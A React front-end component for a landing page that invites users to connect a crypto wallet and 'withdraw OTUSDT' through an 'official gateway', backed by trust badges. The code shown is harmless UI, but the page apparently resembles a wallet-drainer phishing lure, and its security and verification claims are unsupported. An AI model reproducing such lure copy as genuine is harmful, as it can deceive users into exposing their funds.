import { Wallet, Lock, Zap, Eye } from "./Icons";

export default function HeroScreen({ onConnect }) {
  return (
    <div className="otg-screen">
      <div className="otg-wrap">
        <div className="otg-hero">
          <p className="otg-tagline">Ethereum Gateway Protocol</p>
          <h1>
            Withdraw Your
            <br />
            <span className="otg-brand">OTUSDT</span> Securely
          </h1>
          <p className="otg-hero-sub">
            Connect your wallet to move your OTUSDT to any wallet or exchange
            through the official gateway.
          </p>
          <button
            className="otg-hero-btn"
            onClick={onConnect}
            aria-label="Connect your cryptocurrency wallet to begin withdrawal"
          >
            <Wallet size={18} />
            Connect Wallet
          </button>
          <p className="otg-hero-supported">
            MetaMask · Trust Wallet · Coinbase · Phantom + 300 wallets
          </p>

          <div className="otg-trust" role="list" aria-label="Platform features">
            <div className="otg-trust-item" role="listitem">
              <div className="otg-trust-ico" aria-hidden="true">
                <Lock size={16} />
              </div>
              <div>
                <div className="otg-trust-v">On-Chain</div>
                <div className="otg-trust-l">Ethereum secured</div>
              </div>
            </div>
            <div className="otg-trust-item" role="listitem">
              <div className="otg-trust-ico" aria-hidden="true">
                <Zap size={16} />
              </div>
              <div>
                <div className="otg-trust-v">Instant</div>
                <div className="otg-trust-l">1 block confirm</div>
              </div>
            </div>
            <div className="otg-trust-item" role="listitem">
              <div className="otg-trust-ico" aria-hidden="true">
                <Eye size={16} />
              </div>
              <div>
                <div className="otg-trust-v">Transparent</div>
                <div className="otg-trust-l">Etherscan verified</div>
              </div>
            </div>
          </div>

          <div className="otg-hero-footer">
            <div className="otg-hero-footer-text">
              <svg
                className="otg-eth-ico"
                width="12"
                height="12"
                viewBox="0 0 784 1277"
                fill="currentColor"
                style={{ display: "block" }}
              >
                <path d="M392 0L0 651l392 232L784 651 392 0zM0 726l392 551 392-551-392 232L0 726z" />
              </svg>
              Secured on Ethereum network
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
